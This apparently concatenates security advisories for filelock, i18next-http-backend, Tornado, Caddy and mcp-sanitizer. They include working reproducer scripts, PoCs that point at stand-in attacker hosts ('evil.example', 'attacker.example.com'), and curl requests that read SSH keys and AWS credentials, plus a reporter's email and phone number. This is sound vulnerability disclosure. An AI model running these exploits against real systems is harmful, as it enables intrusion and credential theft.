items.summary:
`raise_on_not_writable_file()` is the check that `SoftFileLock` and the locks sharing its acquire path run before every attempt. It looks at the lock path with `os.lstat`, so that it judges a planted symlink (a file that points at another path) by itself. When the node has no owner-write bit, it then calls `os.access(filename, os.W_OK)`, which follows symlinks. A local user who can create entries in the lock's directory can swap the path between a mode-`0466` file and a symlink to a path of their choosing. The second call then reports on the symlink's target with the permissions of the user running the lock (below: the lock user). The lock user's `acquire()` ends in `PermissionError` within a fraction of a second when the target is missing or not writable by the lock user, and in the ordinary `Timeout` otherwise.

That yields one bit per watched acquire. The bit says whether a path exists and is writable by the lock taker. It covers paths under directories the other user cannot search, or any path when root takes the lock. The lock does not open, create or modify anything through the symlink. On Linux, `fs.protected_symlinks` (a kernel setting that refuses to follow another user's symlink in a sticky world-writable directory) blocks it in a directory such as `/tmp`. It does not block it in a `0777` directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it) or in a sticky group-writable one. This reopens the leak PR #567 closed. Affected versions are filelock 3.32.6 through 4.2.0.

Anthropic's OSS Scanner reported this in private. Finding covered by this advisory:

- `ANT-2026-RQ91AXTW` [medium, CWE-59]: Symlink TOCTOU in raise_on_not_writable_file leaks file existence.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N` scores 2.5 (Low).**

`AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:H` (high attack complexity): the swap has to land between two system calls a few bytecodes apart (6 to 12 % of back-to-back acquires with the other user on a second CPU, 1 in 8 000 on one CPU), and the other user has to observe how the lock user's acquire ended. `C:L` (partial confidentiality impact): one bit per acquire (existence or writability of a chosen path), no content. `I:N` and `A:N` (no integrity or availability impact). `S:U` (scope unchanged).

Classification from the review: **security, conditional**, "a one-bit probe of a victim-only path" that "Linux protected symlinks block in the common sticky `/tmp` case, but not every shared directory". The scanner rated this medium. The maintainers score it low for the complexity and the one-bit yield.

## Scope and preconditions

- The affected classes are `SoftFileLock` and everything that reuses its `_acquire`: `MarkerSoftFileLock`, `SoftFileLease`, the async soft locks, and `FileLock` after an `ENOSYS` fallback to a soft lock. `UnixFileLock` itself does not call the helper. `WindowsFileLock._acquire()` does, but on Windows `os.access` reads the link's own read-only attribute and does not follow it; that branch did not run.
- The other user must be able to create entries in the lock's directory. With Linux defaults (`fs.protected_symlinks=1`) the kernel refuses the lock user's attempt to follow another user's symlink in a directory that is both sticky and world-writable. `/tmp` therefore gives `PermissionError` for every target and leaks nothing. A `0777` directory without the sticky bit, or a sticky group-writable one (`1770` with a shared group), has no such cover and leaks as described. macOS and the BSDs have no `fs.protected_symlinks`, and a symlink there has mode bits of its own, so one without the owner-write bit would reach `os.access` with no swap at all (not executed).
- The swap is practical only with a second CPU for the other user.
- The other user needs to see how the lock user's acquire ended, for example the exception in a shared log, an exit status, or when the job stopped (`PermissionError` ends a blocking acquire within about a second; the other case runs to its timeout). The scanner also observed a variant that needs no output from the lock user. Hold the soft lock, set the marker (the lock file whose presence says a process holds the lock) to mode `0o066`, swap the symlink in and out for a few seconds, release, and see whether a marker owned by the other uid appears. A contender still waiting takes the lock; one that raised is gone.
- The `O_NOFOLLOW` open that follows the check is not affected. The lock does not read, create or modify anything through the symlink.

## Affected code

Scanned commit `b831496b0273`: in `raise_on_not_writable_file`, the [`os.lstat` that states the invariant](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L46-L50) and the [`os.access` call that follows symlinks](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L63-L71); the [call from `SoftFileLock._acquire`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L63) at the start of every poll.

## Introduced

[f2f7b86](https://github.com/tox-dev/filelock/commit/f2f7b8696426) "fix: respect ACL write access when the owner write bit is absent" ([#728](https://github.com/tox-dev/filelock/pull/728), 2026-09-08), first tag 3.32.6 (verified), appended the `os.access` call to the `not S_IWUSR` test. [#567](https://github.com/tox-dev/filelock/pull/567) (022394c, first tag 3.29.5) had changed the helper from `os.stat` to `os.lstat` so that a symlink planted at the lock path could not probe its target.

## Mechanism

`SoftFileLock._acquire` calls the helper first, once per `poll_interval` (0.05 s by default) for as long as the lock user waits. The helper runs `os.lstat(path)`. When the node has no `S_IWUSR` it runs `os.access(path, os.W_OK, effective_ids=...)` without `follow_symlinks=False`. On current Linux that is `faccessat2(AT_FDCWD, path, W_OK, AT_EACCESS)`, which resolves a symlink. If that returns false, a second `os.lstat` confirms a node is still there and the helper raises `PermissionError`. The other user's planted file has mode `0466`: no owner-write bit, which sends the helper on to `os.access`, and other-writable, so that `os.access` on the file itself says yes. The other user alternates the file and a symlink at the path (`os.replace` of a fresh symlink, then `os.replace` of a hard link to the marker; the lock would evict a symlink left for 2 s as a malformed marker).

One call of the helper then goes one of three ways. First, `lstat` sees the symlink (mode `0777` on Linux, `S_IWUSR` set), `os.access` is not called, the helper returns. Second, `lstat` sees the file and `os.access` sees the file: true, returns. Third, `lstat` sees the file and `os.access` sees the symlink, resolved to its target with the lock user's permissions: returns if the lock user may write the target, otherwise raises `PermissionError`. After a return, the `O_CREAT | O_EXCL | O_NOFOLLOW` open fails with `EEXIST` and the poll ends as "lock is held". `PermissionError` therefore comes only from the third way and only for a target the lock user cannot write, and it leaves `acquire()` at once instead of after the timeout.

The scanner measured what the outcome encodes with 4 000 non-blocking acquires per target as `victim` (uid 1000, `0700` private directory). An existing file or directory of `victim`: 0 `PermissionError`. A missing name there gives 311 to 339. A `0444` file of `victim`: 433 to 460. `/etc/passwd` or `/etc/shadow`: 237 to 422. With root taking the lock the answer is plain existence, 0 for `/etc/shadow` and `/root/.bashrc`, 366 for a missing name under `/root`. A symlink alone at the path, without the swap, tells nothing (2 000 `Timeout` of 2 000 for both targets, then evicted as malformed after 2 s).

## Reproduction

The scanner's reproducer for `ANT-2026-RQ91AXTW`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import time

VICTIM_JOB = "/tmp/repro.d/victim_job.py"
ATTACKER = "/tmp/repro.d/attacker_swaps_lock_path.py"
private_dir = "/tmp/victim-private"
shared_dir = "/tmp/team-locks"
lock_path = shared_dir + "/app.lock"
as_victim = dict(user="victim", group="victim", extra_groups=[])
as_attacker = dict(user="attacker", group="attacker", extra_groups=[])

assert len(os.sched_getaffinity(0)) >= 2, "the attacker's swap needs a CPU of its own"

# set up: victim's 0700 directory holds "present" and no "absent"
shutil.rmtree(private_dir, ignore_errors=True)
os.mkdir(private_dir, 0o700)
open(private_dir + "/present", "w").close()
shutil.chown(private_dir + "/present", "victim", "victim")
shutil.chown(private_dir, "victim", "victim")

job_ended_with = {}
for name in ("present", "absent"):
    probed_path = f"{private_dir}/{name}"
    attackers_stat = subprocess.run(["stat", probed_path], capture_output=True, text=True, **as_attacker)
    assert attackers_stat.returncode != 0, "attacker can stat the probed path directly"
    print(f"CONTROL  attacker's own look: {attackers_stat.stderr.strip()}")

    # 0777 without the sticky bit: fs.protected_symlinks does not cover it
    shutil.rmtree(shared_dir, ignore_errors=True)
    os.mkdir(shared_dir)
    os.chmod(shared_dir, 0o777)

    # attack: the lock path keeps alternating between a held marker and a symlink to probed_path
    attacker = subprocess.Popen([sys.executable, ATTACKER, lock_path, probed_path], **as_attacker)
    deadline = time.monotonic() + 10
    while not os.path.lexists(lock_path):
        assert time.monotonic() < deadline, "attacker did not plant the lock path"
        time.sleep(0.01)

    started = time.monotonic()
    job = subprocess.run([sys.executable, VICTIM_JOB, lock_path], capture_output=True, text=True, **as_victim)
    waited = time.monotonic() - started
    attacker.kill()
    attacker.wait()

    job_ended_with[name] = (job.stderr or job.stdout).strip().splitlines()[-1]  # last line of the traceback
    print(f"OBSERVED {probed_path} exists={os.path.exists(probed_path)} (read as root); "
          f"victim's job ended after {waited:.1f} s with: {job_ended_with[name]}")

# check: a lock that ignores the symlink's target ends both jobs in Timeout; here the ending tells the two apart
timeout_where_present = job_ended_with["present"].startswith("filelock._error.Timeout:")
permission_error_where_absent = job_ended_with["absent"].startswith("PermissionError:")
print("BUG" if timeout_where_present and permission_error_where_absent else "OK")
```

**`repro.d/attacker_swaps_lock_path.py`**

```python
#!/usr/bin/env python3
import os
import sys
import time

lock_path, probed_path = sys.argv[1], sys.argv[2]
held_marker = lock_path + ".held"
staged = lock_path + ".staged"

with open(held_marker, "w") as marker:
    marker.write("1\nanother-host\n")  # pid 1 on another host: never judged stale, so the victim keeps polling
# no u+w sends raise_on_not_writable_file() on to os.access(); o+w makes os.access() pass for this file itself
os.chmod(held_marker, 0o466)

give_up_at = time.monotonic() + 60
while time.monotonic() < give_up_at:
    # a fresh symlink each round: one left unchanged for 2 s is evicted as a malformed marker
    os.symlink(probed_path, staged)
    os.replace(staged, lock_path)
    os.link(held_marker, staged)
    os.replace(staged, lock_path)
```

**`repro.d/victim_job.py`**

```python
#!/usr/bin/env python3
import sys

from filelock import SoftFileLock

with SoftFileLock(sys.argv[1], timeout=5):
    print("working under the lock")
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as other account (second CPU)
    participant L as app.lock in a 0777 non-sticky directory
    participant V as lock user: SoftFileLock(path, timeout=5)
    participant P as /home/victim/private (0700)
    A->>L: plant 0466 marker naming pid 1 on another host (not stale at any time)
    loop every few microseconds
        A->>L: os.replace(fresh symlink -> /home/victim/private/absent)
        A->>L: os.replace(hard link to the 0466 marker)
    end
    loop every poll_interval (0.05 s)
        V->>L: os.lstat -> regular file, no S_IWUSR
        rect rgb(255, 214, 214)
            V->>L: os.access(path, W_OK) lands on the symlink
            L->>P: resolved to /home/victim/private/absent with the lock user's permissions
            P-->>V: False (missing)
            V->>L: os.lstat -> a node is there
            V->>V: raise PermissionError after 0.4 s instead of Timeout after 5 s
        end
    end
    A->>A: the lock user's job ended early: the name does not exist (or is not writable by the lock user)
```

## Evidence

The scanner reproducer runs with `victim` uid 1000 owning `/tmp/victim-private` mode `0700` holding `present` and not `absent`; `attacker` uid 1001, no shared group; lock directory `/tmp/team-locks` root-owned `0777` without the sticky bit; `fs.protected_symlinks=1`; 2 CPUs; Linux 6.1, CPython 3.14.8. It printed `CONTROL attacker's own look: stat: cannot statx '/tmp/victim-private/present': Permission denied` and then `OBSERVED /tmp/victim-private/present exists=True (read as root); victim's job ended after 5.1 s with: filelock._error.Timeout ...`. For the other target it printed `CONTROL ... '/tmp/victim-private/absent': Permission denied` and `OBSERVED /tmp/victim-private/absent exists=False (read as root); victim's job ended after 0.4 s with: PermissionError: [Errno 13] Permission denied: '/tmp/team-locks/app.lock'`, then `BUG`. The verdict requires the job for `present` to end in `Timeout` and the job for `absent` in `PermissionError`. In 40 runs a blocking acquire met its first `PermissionError` after 0.1 to 0.7 s.

In the maintainers' triage the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 release image. The independent review (`soft-open`) confirmed the mechanism and checked on macOS that `os.access` there supports `follow_symlinks`, relevant to the platform note above.

## Impact

A local user who can write the directory of a soft lock learns, for a path of its choosing, whether that path exists and is writable by the user taking the lock. That includes paths under directories the other user cannot search (a `0700` home or project tree; any path when root takes the lock), one bit per acquire it watches, repeatable with a different target each time. The reproducer shows the existence half; a read-only file of the lock user gives the same `PermissionError` as a missing name. The lock opens, creates and modifies nothing through the symlink, and the acquire itself is not redirected. The other user can already deny the lock by planting a marker, so the early `PermissionError` is not a new availability effect. This is the disclosure PR #567 closed, reachable again through the call PR #728 added.

## Workarounds

- Keep soft-lock directories writable only by the lock's own account, or use a sticky world-writable directory on Linux with `fs.protected_symlinks=1` (the default), where the kernel refuses to follow another user's symlink and the check leaks nothing.
- Do not take soft locks as root in directories other users can write.
- Where a group-shared directory is unavoidable, give the marker an owner-write bit (the default mode does) and do not rely on ACL-granted access, so the `os.access` branch is not reached for the lock user's own marker. The other user's planted `0466` file still reaches it, so this only narrows the window.

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/835

## Affected versions
Verified on 4.0.2 (latest on npm) and on commit 07e0288 (the GHSA-xvq9-wjp8-hwqf fix). Earlier 3.x/4.x versions that allow `/` in ns are likely affected too. Not verified on them.

## Impact
Same class as GHSA-xvq9-wjp8-hwqf and GHSA-q89c-q3h5-w34g: when an attacker controls the namespace value, the request goes to an attacker-chosen origin. In a browser this loads attacker-controlled translation JSON (content injection into the UI, and XSS where translations are rendered as HTML). The precondition is a template with `{{ns}}` right after a leading `/`, for example `/{{ns}}/{{lng}}.json`. The 4.0.2 maintainer note says templates with a leading `/` are safe. This case is outside that statement.

## Root cause
`isSafeNsUrlSegment` rejects any ns containing `//`, but allows a single leading `/` (needed for nested namespaces like `a/b`). Interpolation into `/{{ns}}/...` puts the template's own `/` next to the value's `/`. The result starts with `//`, which is a protocol-relative URL. The check runs on the value, not on the final URL.

## Minimal PoC
```js
import Backend from 'i18next-http-backend'
const b = new Backend(null, { loadPath: '/{{ns}}/{{lng}}.json',
  request: (opts, url, payload, cb) => { console.log(url, '->', new URL(url, 'https://app.example/').origin); cb(null, { status: 200, data: '{}' }) } })
b.read('en', '/evil.example', () => {})
```
Observed on 4.0.2:
```
POC ns=/evil.example  loadPath=/{{ns}}/{{lng}}.json => url=//evil.example/en.json  origin in page https://app.example/ = https://evil.example
```

## Negative controls (same run)
- ns `//evil.example`: rejected ("unsafe lng/ns value").
- lng `http:127.0.0.1:9` (the GHSA-xvq9 payload): rejected.
- ns `common` and nested ns `a/b`: `common/en.json` and `a/b/en.json`, same origin.

## Suggested fix
Validate the final interpolated URL, not just the values: reject it if it starts with `//` or `\`, or if it has a scheme or host the template did not have. The advisory already recommends this ("parse the final URL and require it to remain within the intended origin and path"). Alternatively, reject an ns that starts with `/`.

## Disclosure
We intend to keep this private for 90 days from the date of the report, or until a fixed release is available, whichever comes first, and are happy to adjust if you need more time.

## Re-verification
Re-run on 2026-10-14 against the same latest release. The PoC still reproduces and the negative controls still hold.

Reported by Zachariah Mithani.

## Maintainer note

Confirmed and fixed in 4.0.3 (commit i18next/i18next-http-backend@042c3d4).

**Preconditions.** The `loadPath` / `addPath` template must put `{{ns}}` directly after a leading `/` (for example `/{{ns}}/{{lng}}.json`), and the attacker must control the namespace value. Applications usually set namespaces in code rather than from user input. The default `/locales/{{lng}}/{{ns}}.json`, templates with an origin, and templates with a fixed path segment before `{{ns}}` are not affected. Only browsers are affected: in Node, `fetch('//host/...')` fails because there is no base URL to resolve against. XSS additionally requires the application to render translations as HTML.

**Fix.** The 4.0.2 `//` check looked at each value on its own and could not see the `/` the template puts in front of it. `interpolateUrl` now also checks the interpolated URL: it may only start with `//` or `\` if the template itself does. Protocol-relative CDN templates such as `//cdn.example/{{lng}}/{{ns}}.json` keep working.

**Affected range.** Versions before 3.0.5 had no value validation at all and are reachable through this vector too, so the affected range is `< 4.0.3`.

**Related.** i18next-fs-backend had the same class of problem for file paths (a leading `/` in `ns`, or `C:` in `lng`, changing the root of a path built from a template that starts with the placeholder). It is fixed in i18next-fs-backend 2.6.9.

### Summary

`tornado.web.RedirectHandler` builds its target URL by substituting parts of the request path into a template. Depending on where those substitutions appear in the template, an attacker can craft a request that redirects to a host of their choosing. This creates an open redirect on the application's domain, which can be used in phishing.

### Impact

Applications are affected if they use `RedirectHandler` with a URL template where a regex capture group can influence the scheme or host of the redirect. This includes:

- **A substitution at the start of the path**, for example `(r"/(.*)/target", RedirectHandler, {"url": "/{0}/destination"})`. A request to `https://example.com//evil.com/target` redirects to `//evil.com/destination`, a protocol-relative URL pointing to evil.com. Variants using backslashes or encoded characters have the same effect, because browsers treat them as equivalent to `//`.
- **A substitution directly after the host**, for example `(r"/old(.*)", RedirectHandler, {"url": "https://new.example.com{0}"})`. A request to `/old.evil.com/` or `/old@evil.com/` redirects to evil.com.
- **A template that begins with a substitution** (such as `"{0}"`), which can be given an absolute URL.

Applications are not affected if their `RedirectHandler` templates use only static URLs, or if every substitution comes after a fixed host and a `/` (for example `"/static/{0}"` or `"https://example.com/{0}"`). Other uses of `RequestHandler.redirect()` are not affected by this advisory, although applications that pass user-controlled input to `redirect()` should validate it themselves.

### Patches

Fixed in Tornado 6.6. `RedirectHandler` now returns a 400 error if the substituted values would change the scheme or host of the redirect from what the template specifies. As a result, substitutions can no longer be used in the scheme or host part of a template. The similar check in `StaticFileHandler` has also been hardened against backslash and whitespace variants.

### Workarounds

- Change `RedirectHandler` templates so every substitution comes after a fixed prefix ending in `/`, or write capture-group regexes that cannot match characters such as `/`, `\`, `@`, `.` or `:` where they could affect the host.
- Alternatively, replace `RedirectHandler` with a custom handler that validates the target before calling `self.redirect()`.

### Credit

Reported by Longwei Wang (@gn00295120).

### AI Disclosure
This vulnerability was discovered via deepseek-v4-pro[1m] for finding potential vulnerabilities / inconsistencies in the code base. I made the AI check if Caddy is compliant with various RFCs, incl. 7230. I also used it to help write the PoC, since it was honestly much faster than writing it by hand. I also let it write parts of this advisory text for brevity's sake, but had to rewrite half of it by hand.  

### Summary
Caddy's reverse proxy fails to strip RFC 7230 hop-by-hop headers from upstream responses when handling WebSocket upgrades (HTTP 101 Switching Protocols). Headers including `Alt-Svc`, `Keep-Alive`, `Proxy-Authenticate`, `Transfer-Encoding`, or `Trailer`, which Caddy actually correctly strips for normal HTTP responses, pass through unfiltered to the client during protocol upgrades. An upstream that sets these headers (intentionally or otherwise) can inject them into client responses, enabling connection hijacking via `Alt-Svc`, cookie injection via `Set-Cookie`, and proxy authentication phishing.

The normal response path in `finalizeResponse` correctly strips all hop-by-hop headers before forwarding, but the 101 code path returns early, skipping the stripping entirely.

### Details

In `modules/caddyhttp/reverseproxy/reverseproxy.go`, the `finalizeResponse` method (line 1178) handles upstream responses. For all normal responses, it strips hop-by-hop headers before copying to the client:

```go
// reverseproxy.go:1194-1198
removeConnectionHeaders(res.Header)
for _, h := range hopHeaders {
    res.Header.Del(h)
}
```

However, the 101 Switching Protocols check at line 1187 returns before this stripping code:

```go
// reverseproxy.go:1186-1192
if res.StatusCode == http.StatusSwitchingProtocols {
    var wg sync.WaitGroup
    h.handleUpgradeResponse(logger, &wg, rw, req, res)
    wg.Wait()
    return nil  // <-- returns BEFORE removeConnectionHeaders and hopHeaders loop
}
```

Inside `handleUpgradeResponse` (`streaming.go:60-91`), all upstream response headers are copied to the client without any hop-by-hop filtering:

```go
// streaming.go:88-91
copyHeader(rw.Header(), res.Header)        // copies ALL upstream headers
normalizeWebsocketHeaders(rw.Header())     // only remaps Sec-WebSocket-* keys
```

The `normalizeWebsocketHeaders` function (line 714) only handles WebSocket-specific header key mapping (`Sec-Websocket-*` to `Sec-WebSocket-*`). It does not strip hop-by-hop headers.

#### Hop-by-Hop Headers That Leak Through

Defined at `reverseproxy.go:1681-1692`:

```
Alt-Svc, Connection, Proxy-Connection, Keep-Alive, Proxy-Authenticate,
Proxy-Authorization, Te, Trailer, Transfer-Encoding, Upgrade
```

All 10 are stripped from normal responses. **None** are stripped from WebSocket upgrade responses.

For HTTP/2 and HTTP/3 WebSocket connections (extended CONNECT with `:protocol: websocket`), Caddy converts the upstream's 101 into a `200 OK` for the client (`streaming.go:99-104`). The leaked headers arrive in a standard HTTP 200 response that browsers fully process, making `Alt-Svc` hijacking and `Set-Cookie` injection practically exploitable.

Normal (200): `removeConnectionHeaders()` runs, `hopHeaders` loop runs ->  headers stripped
Upgrade (101): `handleUpgradeResponse()` runs, returns early -> headers are NOT stripped

This is the only response code path in the reverse proxy that bypasses hop-by-hop header stripping.

### PoC

Caddy config:
```
:8080 {
    reverse_proxy localhost:8083
}
```

Script:
```python
import socket

UPSTREAM = (
    b"HTTP/1.1 101 Switching Protocols\r\n"
    b"Upgrade: websocket\r\n"
    b"Connection: Upgrade\r\n"
    b"Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n"
    b"Alt-Svc: h2=\"attacker.example.com:443\"; ma=86400\r\n"
    b"Keep-Alive: timeout=999\r\n"
    b"Proxy-Authenticate: Basic realm=\"phish\"\r\n"
    b"Set-Cookie: injected=malicious; Path=/\r\n"
    b"\r\n"
)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 8083))
s.listen(1)
conn, _ = s.accept()
conn.send(UPSTREAM)
```

Curl:
```bash
curl -v \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  http://localhost:8080/ws 2>&1
```

Output: 
```
< HTTP/1.1 101 Switching Protocols
< Alt-Svc: h2="attacker.example.com:443"; ma=86400
< Connection: Upgrade
< Keep-Alive: timeout=999
< Proxy-Authenticate: Basic realm="phish"
< Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
< Server: Caddy
< Set-Cookie: injected=malicious; Path=/
< Upgrade: websocket
```

`Alt-Svc`, `Keep-Alive`, and `Proxy-Authenticate` are hop-by-hop headers that MUST NOT be retransmitted by proxies per RFC 7230 §6.1. They all appear in the response.

Same upstream, same headers but on a 200 response. 
Caddy strips `Alt-Svc` correctly:

```bash
curl -v http://localhost:8080/
# Alt-Svc is absent 
```

### Impact
This is a hop-by-hop header leakage vuln (I think CWE-444 fits closest?). The proxy fails to enforce the RFC 7230 §6.1 requirement that hop-by-hop headers must not be forwarded across proxy boundaries.

Any Caddy deployment that proxies WebSocket connections, especially those using HTTP/2 or HTTP/3 (where the 101-to-200 conversion makes headers fully processable by browsers) has this issue. 

How an attack might look:
A company serves app.example.com behind Caddy, with HTTP/2 enabled. The app uses WebSockets for real-time notifications (i.e. every page load opens one). The upstream app gets compromised (unpatched CMS plugin, leaked CI credential, dependency confusion). The attacker adds one line to the WebSocket handler: Set-Cookie: session=hijack; Path=/. 

Now every visitor to app.example.com gets the attacker's session cookie written into their browser. The app uses the session cookie as the sole authentication token. When a user reloads the page or navigates to another part of the app, their browser sends session=hijack along with the request. The attacker submits the same value from their own browser. They get logged in as that user.

Caddy strips this header on normal HTTP responses. It strips hop-by-hop headers on the request side, basically everywhere except this path. 

### Suggested Fix
I'll add my fix to the branch in this security advisory.

### Contact Details
If you find this find worth your time you can contact me under d.ramadani@ieee.org or +43 (677) 63 397 910. In case this is something that will go public I'd be happy to be mentioned under my real name, Dionis Ramadani. 

Thank you for taking the time, I hope this is something interesting for you.

items.summary:
## File Path Sanitizer Permits Arbitrary User-Home Absolute Paths

### Summary

`mcp-sanitizer` v1.3.3 explicitly whitelists `/home/` and `/Users/` as allowed absolute path prefixes in its file path validation logic (`src/utils/validation-utils.js:188-196`). As a result, paths such as `/home/alice/.ssh/id_rsa` and `/home/alice/.aws/credentials` pass through `sanitizer.sanitize()` with `blocked=false`, even though they point to highly sensitive files outside any configured safe root. Any consumer application that trusts the sanitized path and passes it to a filesystem read/write operation (e.g., `fs.readFile`) will expose arbitrary user-home directory files to an unauthenticated network attacker. Dynamic reproduction confirmed exfiltration of a simulated SSH private key and AWS credentials via a single HTTP POST request.

### Details

The vulnerability resides in the `validateFilePath` function inside `src/utils/validation-utils.js`. When an absolute path falls outside the configured safe root directories, the function performs a secondary check against a hardcoded allowlist:

```js
// src/utils/validation-utils.js:188-196
if (!isInSafeLocation && path.isAbsolute(normalizedPath)) {
  const allowedAbsolutePaths = ['/tmp/', '/var/tmp/', '/home/', '/Users/'];
  const isAllowedAbsolute = allowedAbsolutePaths.some(allowed =>
    normalizedPath.toLowerCase().startsWith(allowed.toLowerCase())
  );

  if (!isAllowedAbsolute) {
    throw new Error('Absolute path not in allowed safe directory');
  }
}
```

Because `/home/` and `/Users/` are included in `allowedAbsolutePaths`, any path beneath those directories — including `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.kube/config`, `~/.gnupg/`, etc. — is considered safe and passes validation unchanged.

The dangerous paths (`dangerousUnixPaths` at `src/utils/validation-utils.js:135`) only cover `/etc/`, `/proc/`, `/sys/`, `/dev/`, `/root/`, `/boot/`, `/usr/bin/`, and `/sbin/`. Home-directory sensitive subdirectories (`.ssh`, `.aws`, `.gnupg`, `.kube`, `.config`) are never checked.

The full data flow from a network request to the vulnerable return value is:

1. **`src/middleware/express.js:538-541`** — The Express middleware routes `file_reader`/`file_writer` tool parameters to `sanitizer.sanitize(params.file_path, { type: 'file_path' })`.
2. **`src/sanitizer/mcp-sanitizer.js:523-524`** — When `context.type === 'file_path'`, `_secureSanitizeFilePath()` is called.
3. **`src/sanitizer/mcp-sanitizer.js:683-687`** — `validateFilePath()` is invoked; if it does not throw, the normalized path is returned as the sanitized value.
4. **`src/utils/validation-utils.js:188-196`** — The `/home/` prefix check passes without error.
5. **`src/utils/validation-utils.js:200-201`** — The original, attacker-controlled absolute path is returned to the caller as a trusted, sanitized value.

A consumer application receiving `{ blocked: false, sanitized: '/home/victim/.ssh/id_rsa' }` is expected to use that path for I/O. The sanitizer's own `README` and middleware integration imply that a `blocked: false` result is safe to act upon.

**Suggested patch:**

```diff
--- a/src/utils/validation-utils.js
+++ b/src/utils/validation-utils.js
@@
   const dangerousUnixPaths = ['/etc/', '/proc/', '/sys/', '/dev/', '/root/', '/boot/', '/usr/bin/', '/sbin/'];
+  const sensitiveHomeFragments = [
+    '/.ssh/', '/.aws/', '/.gnupg/', '/.kube/', '/.config/',
+    '/.npmrc', '/.env'
+  ];
@@
+  const normalizedForSensitiveCheck = normalizedPath.replace(/\\/g, '/').toLowerCase();
+  if (sensitiveHomeFragments.some(fragment => normalizedForSensitiveCheck.includes(fragment))) {
+    throw new Error('Access to sensitive user configuration path not allowed');
+  }
@@
-    const allowedAbsolutePaths = ['/tmp/', '/var/tmp/', '/home/', '/Users/'];
+    const allowedAbsolutePaths = ['/tmp/', '/var/tmp/'];
```

### PoC

**Environment requirements:** Docker, Python 3, Node.js 20

**Step 1 — Build and start the reproduction container:**

```bash
# From the vuln-002/ directory
python3 poc.py
```

The script automatically:
1. Copies the `mcp-sanitizer` source into a Docker build context.
2. Creates simulated victim files at `/home/victim/.ssh/id_rsa` and `/home/victim/.aws/credentials` inside the container.
3. Builds a consumer HTTP server (`server.js`) that calls `sanitizer.sanitize()` and then `fs.readFile` on the returned path.
4. Sends the three test requests described below.

**Step 2 — Manual HTTP requests (after the container is running on port 13572):**

Control test — must be blocked:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/etc/passwd"}}'
# Expected: {"blocked": true}
```

Exploit test 1 — SSH private key exfiltration:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/home/victim/.ssh/id_rsa"}}'
# Expected: {"blocked": false, "EXPLOIT_SUCCESS": true, "file_content": "-----BEGIN RSA PRIVATE KEY-----..."}
```

Exploit test 2 — AWS credentials exfiltration:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/home/victim/.aws/credentials"}}'
# Expected: {"blocked": false, "EXPLOIT_SUCCESS": true, "file_content": "[default]\naws_access_key_id = ..."}
```

**Observed results (Phase 2 dynamic reproduction):**

```
[Test 1 — Control] POST /tool {file_path: '/etc/passwd'}
  => blocked=true  ✓  (dangerousUnixPaths correctly blocks /etc/)

[Test 2 — Exploit] POST /tool {file_path: '/home/victim/.ssh/id_rsa'}
  => blocked=false, EXPLOIT_SUCCESS=true
  sanitized_path: /home/victim/.ssh/id_rsa
  file_content:
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA0Z3VS5JJcds3xHnygWep4PAtEsHABkxFQnPmcEDLXdK
    SECRET_KEY_CONTENT_EXFILTRATED_VIA_HOME_PATH_BYPASS_VULN002
    -----END RSA PRIVATE KEY-----

[Test 3 — Exploit] POST /tool {file_path: '/home/victim/.aws/credentials'}
  => blocked=false, EXPLOIT_SUCCESS=true
  file_content:
    [default]
    aws_access_key_id = AKIAIOSFODNN7EXAMPLE
    aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    region = us-east-1
```

**Root cause confirmed:** `validation-utils.js:190` — `allowedAbsolutePaths` includes `'/home/'` and `'/Users/'`; any absolute path starting with `/home/` passes with `blocked=false`.

### Impact

This is a **Path Traversal / Improper Path Restriction (CWE-22)** vulnerability.

Any application that integrates `mcp-sanitizer` to validate file paths for MCP `file_reader` or `file_writer` tools is affected. The library is explicitly designed for use in MCP servers exposed over a network via the Express middleware. An unauthenticated remote attacker can supply an absolute path to any file under `/home/` or `/Users/` — requiring no authentication, no special privileges, and no interaction from a legitimate user.

**Sensitive targets include but are not limited to:**
- SSH private keys (`~/.ssh/id_rsa`, `~/.ssh/id_ed25519`)
- Cloud provider credentials (`~/.aws/credentials`, `~/.config/gcloud/credentials.db`)
- Kubernetes config (`~/.kube/config`)
- GPG keys (`~/.gnupg/`)
- Application tokens (`~/.npmrc`, `~/.netrc`, `~/.env`)

The confidentiality impact is **High** because SSH keys and cloud credentials grant full access to remote systems and cloud infrastructure. There is no integrity or availability impact, as the vulnerability is limited to reading (and potentially writing) files.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-002 Reproduction: mcp-sanitizer v1.3.3 /home/* path bypass
# Builds a Node 20 container with:
#   - mcp-sanitizer source from the local repo
#   - Fake sensitive files in /home/victim/.ssh/ and /home/victim/.aws/
#   - A consumer HTTP server that trusts the sanitizer

